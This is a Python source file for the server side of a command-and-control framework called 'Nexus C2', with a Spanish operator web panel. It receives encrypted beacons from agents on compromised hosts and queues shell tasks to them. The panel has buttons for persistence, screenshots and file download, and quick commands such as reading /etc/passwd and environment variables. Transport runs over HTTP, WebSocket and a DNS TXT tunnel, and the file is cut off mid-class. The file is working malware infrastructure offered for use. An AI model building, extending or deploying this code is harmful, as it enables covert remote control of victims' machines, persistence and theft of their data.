import asyncio
import base64
import json
import logging
import os
import re
import socket as _socket
import struct
import time
import uuid

import aiohttp
from aiohttp import web

from protocol import (
    MSG_HELLO, MSG_BEACON, MSG_TASK, MSG_RESULT,
    MSG_NOP, MSG_ERROR, MSG_NAMES,
    pack_clear, unpack_clear,
    server_process_hello, build_frame, parse_frame,
    generate_server_keypair, save_server_key, load_server_key, get_pub_bytes,
)
from cryptography.exceptions import InvalidTag

# ---------------------------------------------------------------------------
# Operator web panel (served at GET /)
# ---------------------------------------------------------------------------
_PANEL_HTML = """<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
<title>Nexus C2</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0d0d0d;color:#e0e0e0;font-family:'Courier New',monospace;height:100vh;display:flex;flex-direction:column}
header{background:#111;border-bottom:1px solid #00ff41;padding:10px 20px;display:flex;align-items:center;gap:16px;flex-shrink:0}
header h1{color:#00ff41;font-size:1.1em;letter-spacing:3px}
.badge{font-size:.7em;color:#444;border:1px solid #222;padding:2px 8px;border-radius:2px}
.container{display:grid;grid-template-columns:1fr 1fr;gap:12px;padding:12px;flex:1;min-height:0}
/* Left column: agents table (top) + terminal (bottom) */
.left-col{display:flex;flex-direction:column;gap:12px;min-height:0}
.panel{background:#111;border:1px solid #222;border-radius:3px;display:flex;flex-direction:column;overflow:hidden}
.agents-panel{flex:1;min-height:0}
.panel-title{background:#1a1a1a;border-bottom:1px solid #222;padding:7px 12px;font-size:.7em;color:#666;text-transform:uppercase;letter-spacing:1px}
table{width:100%;border-collapse:collapse;font-size:.82em}
th{background:#161616;color:#555;padding:6px 10px;text-align:left;font-size:.7em;text-transform:uppercase;border-bottom:1px solid #222}
td{padding:7px 10px;border-bottom:1px solid #1a1a1a;cursor:pointer;white-space:nowrap}
tr:hover td{background:#1a1a1a}
tr.selected td{background:#071a07;border-left:2px solid #00ff41}
.dot{display:inline-block;width:7px;height:7px;border-radius:50%;margin-right:5px}
.dot.online{background:#00ff41;box-shadow:0 0 5px #00ff41}
.dot.offline{background:#444}
.jbar{display:inline-block;height:5px;border-radius:2px;vertical-align:middle;margin-right:5px;transition:width .4s,background .4s}
/* Terminal widget */
.terminal{background:#0a0a0a;border:1px solid #1e3a1e;border-radius:3px;flex-direction:column;height:240px;flex-shrink:0;display:none}
.terminal.open{display:flex}
.term-titlebar{background:#111;border-bottom:1px solid #1e3a1e;padding:5px 10px;display:flex;align-items:center;justify-content:space-between;font-size:.7em;color:#555;letter-spacing:1px;flex-shrink:0;user-select:none}
.term-titlebar .tname{color:#00ff41;text-transform:uppercase}
.win-btns{display:flex;gap:7px;align-items:center}
.wbtn{width:11px;height:11px;border-radius:50%}
.wbtn.wclose{background:#ff5f57}.wbtn.wmin{background:#febc2e}.wbtn.wmax{background:#28c840}
.term-body{flex:1;overflow-y:auto;padding:6px 10px;font-size:.79em;line-height:1.6}
.term-body::-webkit-scrollbar{width:3px}
.term-body::-webkit-scrollbar-thumb{background:#1e3a1e;border-radius:2px}
.term-input-row{display:flex;align-items:center;padding:6px 10px 8px;border-top:2px solid #1e4a1e;background:#060f06;gap:0;flex-shrink:0}
.term-prompt{color:#00ff41;white-space:nowrap;font-size:.79em;flex-shrink:0;margin-right:5px}
#term-input{background:transparent;border:none;outline:none;color:#00ff41;font-family:'Courier New',monospace;font-size:.79em;flex:1;caret-color:#00ff41}
#term-input::placeholder{color:#1e3a1e}
.tl{white-space:pre-wrap;word-break:break-all;line-height:1.6}
.tl.cmd{color:#00ff41}
.tl.out{color:#c8c8c8}
.tl.err{color:#ff6666}
.tl.sys{color:#4a4a4a}
/* Results */
.results-body{flex:1;overflow-y:auto;padding:10px}
.r-entry{background:#161616;border:1px solid #222;border-radius:3px;margin-bottom:8px;padding:8px 10px}
.r-meta{color:#555;font-size:.7em;margin-bottom:5px}
.r-out{color:#c8c8c8;white-space:pre-wrap;word-break:break-all;font-size:.8em}
.r-err{color:#ff6666;white-space:pre-wrap;word-break:break-all;font-size:.8em}
.ok{color:#00ff41}.errc{color:#ff4444}
.empty{color:#333;text-align:center;padding:30px;font-size:.8em}
.toast{position:fixed;bottom:30px;right:20px;background:#1a1a1a;border:1px solid #00ff41;color:#00ff41;padding:8px 14px;font-size:.75em;border-radius:3px;opacity:0;transition:opacity .3s;pointer-events:none}
.toast.show{opacity:1}
.statusbar{background:#0a0a0a;border-top:1px solid #1a1a1a;padding:4px 16px;font-size:.68em;color:#333;display:flex;justify-content:space-between;flex-shrink:0}
/* Quick-action plugin buttons */
.plugin-bar{display:flex;gap:6px;padding:6px 10px;background:#0d0d0d;border-top:1px solid #1a1a1a;flex-wrap:wrap}
.plugin-btn{background:#111;color:#00ff41;border:1px solid #1e3a1e;padding:3px 10px;font-family:'Courier New',monospace;font-size:.72em;cursor:pointer;border-radius:2px;transition:background .15s,border-color .15s}
.plugin-btn:hover{background:#1a2e1a;border-color:#00ff41}
.plugin-btn:active{background:#00ff41;color:#000}
.plugin-btn.needs-arg{color:#ffaa00;border-color:#3a2e00}
.plugin-btn.needs-arg:hover{background:#2e2200;border-color:#ffaa00}
/* Shell command dropdown */
.cmd-row{display:flex;gap:6px;align-items:center;padding:6px 10px;background:#0d0d0d;border-top:1px solid #1a1a1a}
.cmd-select{background:#111;color:#666;border:1px solid #222;padding:3px 6px;font-family:'Courier New',monospace;font-size:.72em;border-radius:2px;cursor:pointer;min-width:130px}
.cmd-select:focus{outline:none;border-color:#444}
.cmd-select option{background:#111;color:#aaa}
</style>
</head>
<body>
<header>
  <h1>&#9632; NEXUS C2</h1>
  <span class="badge">PANEL OPERADOR</span>
  <span class="badge" id="hdr-count">...</span>
</header>
<div class="container">
  <div class="left-col">
    <div class="panel agents-panel">
      <div class="panel-title">Agentes</div>
      <div style="flex:1;overflow-y:auto">
        <table>
          <thead><tr><th>Estado</th><th>Agent ID</th><th>Jitter beacon</th><th>Cola</th><th>Inflight</th></tr></thead>
          <tbody id="agent-rows"><tr><td colspan="5" class="empty">Sin agentes</td></tr></tbody>
        </table>
      </div>
    </div>
    <!-- Terminal widget -->
    <div class="terminal" id="terminal">
      <div class="term-titlebar">
        <span>AGENTE: <span class="tname" id="term-title">—</span></span>
        <span class="win-btns">
          <span class="wbtn wmin"></span>
          <span class="wbtn wmax"></span>
          <span class="wbtn wclose"></span>
        </span>
      </div>
      <div class="term-body" id="term-body"></div>

      <!-- Barra de plugins -->
      <div class="plugin-bar" id="plugin-bar">
        <button class="plugin-btn" onclick="runPlugin('!sysinfo')">!sysinfo</button>
        <button class="plugin-btn" onclick="runPlugin('!screenshot')">!screenshot</button>
        <button class="plugin-btn" onclick="runPlugin('!persist')">!persist</button>
        <button class="plugin-btn" onclick="runPlugin('!help')">!help</button>
        <button class="plugin-btn needs-arg" onclick="fillInput('!download ')">!download ···</button>
      </div>

      <!-- Fila de input con dropdown de comandos rápidos -->
      <div class="cmd-row">
        <select class="cmd-select" id="cmd-select" onchange="pickShell(this)">
          <option value="">── shell rápido ──</option>
          <option value="whoami">whoami</option>
          <option value="id">id</option>
          <option value="ps aux">ps aux</option>
          <option value="ls -la">ls -la</option>
          <option value="ls -la /tmp">ls -la /tmp</option>
          <option value="cat /etc/passwd">cat /etc/passwd</option>
          <option value="cat /etc/os-release">cat /etc/os-release</option>
          <option value="ip a">ip a</option>
          <option value="netstat -tlnp">netstat -tlnp</option>
          <option value="ss -tlnp">ss -tlnp</option>
          <option value="crontab -l">crontab -l</option>
          <option value="env">env</option>
          <option value="uname -a">uname -a</option>
          <option value="df -h">df -h</option>
          <option value="free -h">free -h</option>
        </select>
      </div>

      <div class="term-input-row">
        <span class="term-prompt" id="term-prompt">~$&nbsp;</span>
        <input id="term-input" type="text" autocomplete="off" spellcheck="false"/>
      </div>
    </div>
  </div>
  <div class="panel">
    <div class="panel-title">Resultados &mdash; <span id="res-agent" style="color:#00ff41">selecciona un agente</span> <span id="res-count" style="color:#444"></span></div>
    <div class="results-body" id="results-body"><div class="empty">Selecciona un agente</div></div>
  </div>
</div>
<div class="toast" id="toast"></div>
<div class="statusbar"><span id="st-left">Conectando...</span><span id="st-right"></span></div>
<script>
let sel=null,agents=[],cmdHist=[],histIdx=-1,waitTask=null;
const esc=s=>s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
const ts2s=ts=>ts?new Date(ts*1000).toLocaleTimeString():'';

function jBar(ts,st){
  if(st!=='online')return'<span style="color:#333">offline</span>';
  const s=Math.floor(Date.now()/1000-ts);
  const w=Math.min(80,(s/10)*80);
  const c=s<8?'#00ff41':s<15?'#ffaa00':'#ff4444';
  return`<span class="jbar" style="width:${w}px;background:${c}"></span><span style="color:${c}">${s}s</span>`;
}

function toast(msg){
  const t=document.getElementById('toast');
  t.textContent=msg;t.className='toast';
  requestAnimationFrame(()=>t.classList.add('show'));
  setTimeout(()=>t.classList.remove('show'),2500);
}

// ── Terminal ───────────────────────────────────────────────────────────────
function tprint(text,cls='out'){
  const b=document.getElementById('term-body');
  String(text).split('\\n').forEach(line=>{
    const d=document.createElement('div');
    d.className='tl '+cls;
    d.textContent=line;
    b.appendChild(d);
  });
  b.scrollTop=b.scrollHeight;
}

function openTerm(id){
  document.getElementById('term-title').textContent=id.toUpperCase();
  document.getElementById('term-prompt').textContent=id+'@NEXUS-C2:~$ ';
  document.getElementById('term-body').innerHTML='';
  tprint(id+'@NEXUS-C2:~$','sys');
  tprint("Type '!help' to see available commands.",'sys');
  tprint('','sys');
  document.getElementById('terminal').classList.add('open');
  const inp=document.getElementById('term-input');
  inp.disabled=false;inp.focus();
}

const tinp=document.getElementById('term-input');
tinp.addEventListener('keydown',e=>{
  if(e.key==='ArrowUp'){
    e.preventDefault();
    if(histIdx<cmdHist.length-1){
      histIdx++;
      tinp.value=cmdHist[cmdHist.length-1-histIdx];
      setTimeout(()=>tinp.setSelectionRange(tinp.value.length,tinp.value.length),0);
    }
  }else if(e.key==='ArrowDown'){
    e.preventDefault();
    if(histIdx>0){histIdx--;tinp.value=cmdHist[cmdHist.length-1-histIdx];}
    else{histIdx=-1;tinp.value='';}
  }else if(e.key==='Enter'){
    sendCmd();
  }else if(e.key==='l'&&e.ctrlKey){
    e.preventDefault();
    document.getElementById('term-body').innerHTML='';
  }
});

async function sendCmd(){
  const cmd=tinp.value.trim();
  if(!cmd||!sel||waitTask)return;
  if(!cmdHist.length||cmdHist[cmdHist.length-1]!==cmd)cmdHist.push(cmd);
  histIdx=-1;
  tprint(sel+'@NEXUS-C2:~$ '+cmd,'cmd');
  tinp.value='';tinp.disabled=true;
  try{
    const r=await fetch('/agents/'+sel+'/task',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cmd})});
    const b=await r.json();
    if(r.status===429){tprint('Error: cola llena','err');tinp.disabled=false;return;}
    if(!r.ok){tprint('Error: '+(b.error||r.status),'err');tinp.disabled=false;return;}
    waitTask=b.task_id;
    let polls=0;
    const pid=setInterval(async()=>{
      polls++;
      try{
        const res=await fetch('/agents/'+sel+'/results');
        const data=await res.json();
        const found=data.find(x=>x.task_id===waitTask);
        if(found||polls>24){
            clearInterval(pid);waitTask=null;
            if(!found){tprint('Timeout — sin respuesta del agente','err');}
            tinp.disabled=false;tinp.focus();
            refreshResults();
        }
      }catch(e){}
    },2000);
  }catch(e){tprint('Error de red: '+e.message,'err');tinp.disabled=false;}
}

// ── Agents & Results ───────────────────────────────────────────────────────
async function refresh(){
  try{
    const r=await fetch('/agents');agents=await r.json();
    const on=agents.filter(a=>a.status==='online').length;
    document.getElementById('hdr-count').textContent=on+'/'+agents.length+' online';
    document.getElementById('agent-rows').innerHTML=agents.length?agents.map(a=>`
      <tr onclick="pick('${a.agent_id}')"${a.agent_id===sel?' class="selected"':''}>
        <td><span class="dot ${a.status}"></span>${a.status}</td>
        <td>${a.agent_id}</td>
        <td>${jBar(a.last_seen,a.status)}</td>
        <td>${a.pending_tasks}</td>
        <td>${a.inflight_tasks>0?`<span style="color:#ffaa00;font-weight:bold">${a.inflight_tasks} ↗</span>`:'0'}</td>
      </tr>`).join(''):'<tr><td colspan="5" class="empty">Sin agentes registrados</td></tr>';
    document.getElementById('st-left').textContent=on+' agente'+(on!==1?'s':'')+' online';
    document.getElementById('st-right').textContent=new Date().toLocaleTimeString();
  }catch(e){document.getElementById('st-left').textContent='Sin conexión con el servidor';}
}

async function pick(id){
  if(id===sel)return;
  waitTask=null;sel=id;cmdHist=[];histIdx=-1;
  document.getElementById('res-agent').textContent=id.toUpperCase();
  openTerm(id);
  await refreshResults();
  refresh();
}

async function refreshResults(){
  if(!sel)return;
  try{
    const r=await fetch('/agents/'+sel+'/results');
    const data=await r.json();
    document.getElementById('res-count').textContent=data.length?'('+data.length+')':'';
    if(!data.length){document.getElementById('results-body').innerHTML='<div class="empty">Sin resultados aún</div>';return;}
    document.getElementById('results-body').innerHTML=[...data].reverse().map(r=>`
      <div class="r-entry">
        <div class="r-meta">task <b>${(r.task_id||'?').slice(0,8)}</b> &nbsp; exit <span class="${r.exit_code===0?'ok':'errc'}">${r.exit_code}</span> &nbsp; ${ts2s(r.ts)}</div>
        ${r.stdout?`<div class="r-out">${esc(r.stdout.trimEnd())}</div>`:''}
        ${r.stderr?`<div class="r-err">${esc(r.stderr.trimEnd())}</div>`:''}
      </div>`).join('');
  }catch(e){}
}

// Ejecuta un plugin directamente (sin argumento extra)
function runPlugin(cmd){
  if(!sel||waitTask)return;
  const tinp=document.getElementById('term-input');
  tinp.value=cmd;
  sendCmd();
}

// Pre-rellena el input para comandos que necesitan argumentos
function fillInput(prefix){
  if(!sel)return;
  const tinp=document.getElementById('term-input');
  tinp.value=prefix;
  tinp.focus();
  tinp.setSelectionRange(tinp.value.length,tinp.value.length);
}

// Selección del dropdown: mete el comando en el input y ejecuta
function pickShell(sel_el){
  const cmd=sel_el.value;
  sel_el.value='';
  if(!cmd||!sel||waitTask)return;
  const tinp=document.getElementById('term-input');
  tinp.value=cmd;
  sendCmd();
}

refresh();
setInterval(refresh,3000);
setInterval(()=>{if(sel&&!waitTask)refreshResults();},5000);
</script>
</body>
</html>"""

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(name)s] %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("nexus.server")

SERVER_KEY_FILE  = "server_key.bin"
SERVER_PUB_FILE  = "server_pub.hex"
SESSION_TTL      = 300
TASK_QUEUE_MAX   = 100
MAX_RESULTS      = 500
MAX_OUTPUT_BYTES = 64 * 1024
OPERATOR_API_KEY = os.environ.get("NEXUS_API_KEY", "")
ALLOW_CLEAR      = os.environ.get("NEXUS_ALLOW_CLEAR", "0") == "1"
DNS_PORT         = int(os.environ.get("NEXUS_DNS_PORT", "5354"))
DNS_DOMAIN       = b"n\x02c2\x00"  # encoded "n.c2" label sequence

# ---------------------------------------------------------------------------
# Global state (safe: asyncio is single-threaded)
# ---------------------------------------------------------------------------
server_priv   = None          # X25519PrivateKey — loaded at startup
sessions: dict = {}           # session_id_hex -> SessionState
agents:   dict = {}           # agent_id -> AgentState
results:  dict = {}           # agent_id -> [ResultEntry]
tasks:    dict = {}           # agent_id -> asyncio.Queue (PENDING)
inflight: dict = {}           # agent_id -> {task_id -> {task, dispatched_at, timeout_s}}


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _truncate(s: str) -> str:
    encoded = s.encode("utf-8", errors="replace")
    if len(encoded) <= MAX_OUTPUT_BYTES:
        return s
    return encoded[:MAX_OUTPUT_BYTES].decode("utf-8", errors="replace") + "\n[truncated]"


@web.middleware
async def _operator_auth(request: web.Request, handler):
    """Require X-Api-Key only on /agents/* (operator REST API) when NEXUS_API_KEY is set.
    POST / and GET /ws are agent protocol routes — never auth-gated."""
    if OPERATOR_API_KEY and request.path.startswith("/agents"):
        if request.headers.get("X-Api-Key", "") != OPERATOR_API_KEY:
            return web.json_response({"error": "unauthorized"}, status=401)
    return await handler(request)


class SessionState:
    def __init__(self, session_id: bytes, chacha, srv_nonce):
        self.session_id       = session_id
        self.chacha           = chacha
        self.srv_nonce        = srv_nonce
        self.agent_id         = None
        self.last_seen        = time.time()
        self.encrypted        = chacha is not None
        self.last_agent_nonce = -1   # anti-replay: highest agent nonce seen

    def check_nonce(self, frame: bytes) -> None:
        """Raise ValueError if the frame nonce is a replay (≤ last seen)."""
        nonce_int = int.from_bytes(frame[1:13], "little")
        if nonce_int <= self.last_agent_nonce:
            raise ValueError(
                f"replay: nonce {nonce_int} ≤ last seen {self.last_agent_nonce}"
            )
        self.last_agent_nonce = nonce_int


_AGENT_ID_RE = re.compile(r'^[a-zA-Z0-9_-]{1,64}$')

def _validate_agent_id(agent_id: str) -> bool:
    return bool(agent_id) and bool(_AGENT_ID_RE.match(agent_id))


def _ensure_agent(agent_id: str) -> None:
    if agent_id not in agents:
        agents[agent_id] = {
            "agent_id":      agent_id,
            "last_seen":     time.time(),
            "status":        "online",
            "pending_tasks": 0,
            "inflight_tasks": 0,
        }
        results[agent_id]  = []
        tasks[agent_id]    = asyncio.Queue(maxsize=TASK_QUEUE_MAX)
        inflight[agent_id] = {}
        log.info("NEW   agent_id=%.8s", agent_id)
    else:
        agents[agent_id]["last_seen"] = time.time()
        agents[agent_id]["status"]    = "online"


def _dispatch_task(agent_id: str, task: dict, frame_builder) -> bytes:
    """Move task from PENDING → DISPATCHED (inflight). Returns the task frame."""
    agents[agent_id]["pending_tasks"] = max(0, agents[agent_id]["pending_tasks"] - 1)
    inflight.setdefault(agent_id, {})[task["task_id"]] = {
        "task":         task,
        "dispatched_at": time.time(),
        "timeout_s":    task.get("timeout_s", 30),
    }
    agents[agent_id]["inflight_tasks"] = len(inflight[agent_id])
    log.info("TASK   agent_id=%.8s task_id=%.8s cmd=%r [DISPATCHED]",
             agent_id, task["task_id"], task["cmd"])
    return frame_builder(task)


def _complete_task(agent_id: str, task_id: str) -> None:
    """Move task from DISPATCHED → COMPLETE (remove from inflight)."""
    if agent_id in inflight and task_id in inflight[agent_id]:
        del inflight[agent_id][task_id]
        agents[agent_id]["inflight_tasks"] = len(inflight[agent_id])


# ---------------------------------------------------------------------------
# Nexus protocol handler (POST /)
# ---------------------------------------------------------------------------

async def handle_nexus(request: web.Request) -> web.Response:
    body       = await request.read()
    session_id_hex = request.headers.get("X-Session-Id")

    if not body:
        return web.Response(
            body=pack_clear(MSG_ERROR), status=400,
            content_type="application/octet-stream",
        )

    # ── Encrypted session (Fase 3+) ──────────────────────────────────────────
    if session_id_hex and session_id_hex in sessions:
        sess = sessions[session_id_hex]
        if sess.encrypted:
            try:
                msg_type, payload = parse_frame(body, sess.chacha)
            except Exception as exc:
                log.warning("decrypt failed session=%.8s: %s", session_id_hex, exc)
                return web.Response(
                    body=pack_clear(MSG_ERROR), status=401,
                    content_type="application/octet-stream",
                )
            try:
                sess.check_nonce(body)
            except ValueError as exc:
                log.warning("REPLAY blocked session=%.8s: %s", session_id_hex, exc)
                return web.Response(
                    body=pack_clear(MSG_ERROR), status=400,
                    content_type="application/octet-stream",
                )
            return await _dispatch_encrypted(msg_type, payload, sess, session_id_hex)

    # ── Clear frames: HELLO always allowed; BEACON/RESULT only if NEXUS_ALLOW_CLEAR=1 ──
    msg_type, payload = unpack_clear(body)
    name = MSG_NAMES.get(msg_type, f"0x{msg_type:02x}")

    if msg_type == MSG_HELLO:
        return await _handle_hello(body)

    if not ALLOW_CLEAR:
        log.warning("clear frame type=%s rejected (set NEXUS_ALLOW_CLEAR=1 to enable)", name)
        return web.Response(
            body=pack_clear(MSG_ERROR), status=400,
            content_type="application/octet-stream",
        )

    if msg_type == MSG_BEACON:
        return await _handle_beacon_clear(payload)

    if msg_type == MSG_RESULT:
        return await _handle_result_clear(payload)

    log.warning("unknown type=%s len=%d", name, len(body))
    return web.Response(
        body=pack_clear(MSG_ERROR), status=400,
        content_type="application/octet-stream",
    )


async def _handle_hello(body: bytes) -> web.Response:
    """Fase 3: ECDH handshake."""
    try:
        welcome, session_id, session_key, chacha, srv_nonce = \
            server_process_hello(body, server_priv)
    except Exception as exc:
        log.error("HELLO error: %s", exc)
        return web.Response(
            body=pack_clear(MSG_ERROR), status=400,
            content_type="application/octet-stream",
        )
    sid_hex = session_id.hex()
    sessions[sid_hex] = SessionState(session_id, chacha, srv_nonce)
    log.info("HELLO  session=%.16s", sid_hex)
    return web.Response(body=welcome, content_type="application/octet-stream")


async def _handle_beacon_clear(payload: bytes) -> web.Response:
    """Fase 1-2: BEACON in clear — parse JSON, register agent, return NOP or TASK."""
    try:
        data     = json.loads(payload.decode("utf-8"))
        agent_id = data.get("agent_id", "")
    except Exception:
        agent_id = ""
        data     = {}

    if not _validate_agent_id(agent_id):
        log.warning("BEACON with invalid agent_id=%r — ignored", agent_id)
        return web.Response(body=pack_clear(MSG_ERROR), status=400,
                            content_type="application/octet-stream")

    _ensure_agent(agent_id)
    log.info("BEACON agent_id=%.8s ts=%s", agent_id, data.get("ts", "?"))

    q = tasks.get(agent_id)
    if q and not q.empty():
        try:
            task  = q.get_nowait()
            frame = _dispatch_task(agent_id, task,
                        lambda t: pack_clear(MSG_TASK, json.dumps(t).encode()))
            return web.Response(body=frame, content_type="application/octet-stream")
        except asyncio.QueueEmpty:
            pass

    return web.Response(body=pack_clear(MSG_NOP), content_type="application/octet-stream")


async def _handle_result_clear(payload: bytes) -> web.Response:
    """Fase 2: RESULT in clear — store and log."""
    try:
        data     = json.loads(payload.decode("utf-8"))
        agent_id = data.get("agent_id", "")
    except Exception:
        data     = {}
        agent_id = ""

    if not _validate_agent_id(agent_id):
        return web.Response(body=pack_clear(MSG_ERROR), status=400,
                            content_type="application/octet-stream")

    data["stdout"] = _truncate(data.get("stdout", ""))
    data["stderr"] = _truncate(data.get("stderr", ""))

    _ensure_agent(agent_id)
    task_id = data.get("task_id", "?")
    _complete_task(agent_id, task_id)
    log.info("RESULT agent_id=%.8s task_id=%.8s exit=%s [COMPLETE]",
             agent_id, task_id, data.get("exit_code", "?"))

    if agent_id in results:
        bucket = results[agent_id]
        bucket.append(data)
        if len(bucket) > MAX_RESULTS:
            del bucket[0]

    return web.Response(body=pack_clear(MSG_NOP), content_type="application/octet-stream")


async def _dispatch_encrypted(
    msg_type: int, payload: bytes, sess: "SessionState", sid_hex: str
) -> web.Response:
    """Fase 3+: handle decrypted payload."""
    sess.last_seen = time.time()

    if msg_type == MSG_BEACON:
        try:
            data     = json.loads(payload.decode("utf-8"))
            agent_id = data.get("agent_id")
        except Exception:
            agent_id = None
            data     = {}

        if agent_id and not _validate_agent_id(agent_id):
            agent_id = None
        if agent_id and sess.agent_id is None:
            sess.agent_id = agent_id
            _ensure_agent(agent_id)
            log.info("BEACON(enc) agent_id=%.8s (first, session=%.8s)", agent_id, sid_hex)
        elif agent_id:
            _ensure_agent(agent_id)
            log.info("BEACON(enc) agent_id=%.8s", agent_id)

        q = tasks.get(agent_id or "")
        if q and not q.empty():
            try:
                task = q.get_nowait()
                raw  = _dispatch_task(agent_id, task, lambda t: build_frame(
                    MSG_TASK, json.dumps(t).encode("utf-8"),
                    sess.chacha, sess.srv_nonce,
                ))
                return web.Response(body=raw, content_type="application/octet-stream")
            except asyncio.QueueEmpty:
                pass

        nop = build_frame(MSG_NOP, b"", sess.chacha, sess.srv_nonce)
        return web.Response(body=nop, content_type="application/octet-stream")

    if msg_type == MSG_RESULT:
        try:
            data     = json.loads(payload.decode("utf-8"))
            agent_id = sess.agent_id or data.get("agent_id", "")
        except Exception:
            data     = {}
            agent_id = sess.agent_id or ""

        if not _validate_agent_id(agent_id):
            nop = build_frame(MSG_NOP, b"", sess.chacha, sess.srv_nonce)
            return web.Response(body=nop, content_type="application/octet-stream")

        data["stdout"] = _truncate(data.get("stdout", ""))
        data["stderr"] = _truncate(data.get("stderr", ""))

        _ensure_agent(agent_id)
        task_id = data.get("task_id", "?")
        _complete_task(agent_id, task_id)
        log.info("RESULT(enc) agent_id=%.8s task_id=%.8s exit=%s [COMPLETE]",
                 agent_id, task_id, data.get("exit_code", "?"))
        bucket = results.setdefault(agent_id, [])
        bucket.append(data)
        if len(bucket) > MAX_RESULTS:
            del bucket[0]
        nop = build_frame(MSG_NOP, b"", sess.chacha, sess.srv_nonce)
        return web.Response(body=nop, content_type="application/octet-stream")

    log.warning("unexpected encrypted type=0x%02x session=%.8s", msg_type, sid_hex)
    return web.Response(
        body=pack_clear(MSG_ERROR), status=400,
        content_type="application/octet-stream",
    )


# ---------------------------------------------------------------------------
# Operator REST API
# ---------------------------------------------------------------------------

async def api_list_agents(request: web.Request) -> web.Response:
    out = [
        {
            "agent_id":      a["agent_id"],
            "last_seen":     a["last_seen"],
            "status":        a["status"],
            "pending_tasks": a["pending_tasks"],
            "inflight_tasks": a.get("inflight_tasks", 0),
        }
        for a in agents.values()
    ]
    return web.json_response(out)


async def api_enqueue_task(request: web.Request) -> web.Response:
    agent_id = request.match_info["agent_id"]
    if agent_id not in agents:
        return web.json_response({"error": "agent not found"}, status=404)
    try:
        body = await request.json()
    except Exception:
        return web.json_response({"error": "invalid JSON"}, status=400)
    cmd = body.get("cmd", "").strip()
    if not cmd:
        return web.json_response({"error": "missing cmd"}, status=400)
    timeout_s = max(1, min(int(body.get("timeout_s", 30)), 3600))
    task = {
        "task_id":   str(uuid.uuid4()),
        "cmd":       cmd,
        "timeout_s": timeout_s,
    }
    try:
        tasks[agent_id].put_nowait(task)
    except asyncio.QueueFull:
        return web.json_response({"error": "task queue full"}, status=429)
    agents[agent_id]["pending_tasks"] += 1
    log.info("ENQUEUE agent_id=%.8s task_id=%.8s cmd=%r",
             agent_id, task["task_id"], cmd)
    return web.json_response({"task_id": task["task_id"], "status": "PENDING"})


async def api_get_results(request: web.Request) -> web.Response:
    agent_id = request.match_info["agent_id"]
    if agent_id not in results:
        return web.json_response({"error": "agent not found"}, status=404)
    return web.json_response(results[agent_id])


async def handle_panel(request: web.Request) -> web.Response:
    return web.Response(text=_PANEL_HTML, content_type="text/html")


# ---------------------------------------------------------------------------
# WebSocket transport handler  (GET /ws)
# ---------------------------------------------------------------------------

async def handle_ws(request: web.Request) -> web.WebSocketResponse:
    """WebSocket channel — persistent, real-time, no beacon delay."""
    ws = web.WebSocketResponse()
    await ws.prepare(request)
    log.info("WS   new connection from %s", request.remote)

    sid_hex = None
    sess    = None

    async for msg in ws:
        if msg.type != aiohttp.WSMsgType.BINARY:
            continue

        data = msg.data
        if not data:
            continue

        # First frame: wire = [sid_len 1B][sid bytes][frame]
        sid_len = data[0]
        sid_raw = data[1: 1 + sid_len].decode("ascii") if sid_len else ""
        frame   = data[1 + sid_len:]

        # ── Handshake (no session yet) ────────────────────────────────────────
        if not sid_raw or sid_raw not in sessions:
            if not frame or frame[0] != 0x01:   # must be HELLO
                await ws.send_bytes(pack_clear(MSG_ERROR))
                continue
            try:
                welcome, session_id, _, chacha, srv_nonce = \
                    server_process_hello(frame, server_priv)
            except Exception as exc:
                log.error("WS HELLO error: %s", exc)
                await ws.send_bytes(pack_clear(MSG_ERROR))
                continue
            sid_hex = session_id.hex()
            sess = SessionState(session_id, chacha, srv_nonce)
            sessions[sid_hex] = sess
            log.info("WS   HELLO session=%.16s", sid_hex)
            await ws.send_bytes(welcome)
            continue

        # ── Encrypted frame ───────────────────────────────────────────────────
        sess = sessions[sid_raw]
        sid_hex = sid_raw
        try:
            msg_type, payload = parse_frame(frame, sess.chacha)
        except Exception:
            await ws.send_bytes(pack_clear(MSG_ERROR))
            continue
        try:
            sess.check_nonce(frame)
        except ValueError as exc:
            log.warning("WS REPLAY blocked session=%.8s: %s", sid_hex, exc)
            await ws.send_bytes(pack_clear(MSG_ERROR))
            continue

        resp = await _dispatch_encrypted(msg_type, payload, sess, sid_hex)
        await ws.send_bytes(resp.body)

    log.info("WS   closed session=%.16s", sid_hex or "?")
    return ws


# ---------------------------------------------------------------------------
# DNS TXT tunnel handler  (UDP port 5353)
# ---------------------------------------------------------------------------

def _dns_parse_query(data: bytes) -> tuple[bytes, bytes]:
    """Return (txid, encoded_payload) from a DNS TXT query."""
    txid = data[:2]
    pos  = 12   # skip header
    labels = []
    while pos < len(data) and data[pos] != 0:
        length = data[pos]; pos += 1
        labels.append(data[pos: pos + length].decode("ascii", errors="ignore"))
        pos += length

    # Drop the apex labels ("n", "c2"), keep data labels
    payload_labels = labels[:-2] if len(labels) > 2 else labels
    encoded = "".join(payload_labels).upper()
    padding = (8 - len(encoded) % 8) % 8
    raw = base64.b32decode(encoded + "=" * padding)
    return txid, raw


def _dns_build_txt_response(txid: bytes, query: bytes, txt: bytes) -> bytes:
    """Build a minimal DNS TXT response with txt as the record data."""
    # Header
    flags    = b"\x81\x80"   # QR=1 (response), OPCODE=0, AA=1, RD=1, RA=1
    header   = txid + flags + b"\x00\x01\x00\x01\x00\x00\x00\x00"
    # Copy question section from query (starts at byte 12)
    question = query[12:]
    # Answer RR: pointer to question name + TYPE TXT + CLASS IN + TTL 0
    # Split into ≤255-byte TXT strings (DNS limit per string)
    encoded  = base64.b32encode(txt).lower().rstrip(b"=")
    rdata    = b"".join(bytes([min(len(encoded) - i, 255)]) + encoded[i: i + 255]
                        for i in range(0, max(len(encoded), 1), 255))
    answer   = (
        b"\xc0\x0c"                         # name pointer → offset 12
        + b"\x00\x10"                        # TYPE = TXT
        + b"\x00\x01"                        # CLASS = IN
        + b"\x00\x00\x00\x00"               # TTL = 0
        + struct.pack("!H", len(rdata))      # RDLENGTH
        + rdata
    )
    return header + question + answer


class _DnsProtocol(asyncio.DatagramProtocol):
    """Asyncio UDP protocol for the DNS TXT tunnel."""

    def __init__(self):
        self._transport = None

    def connection_made(self, transport):
        self._transport = transport
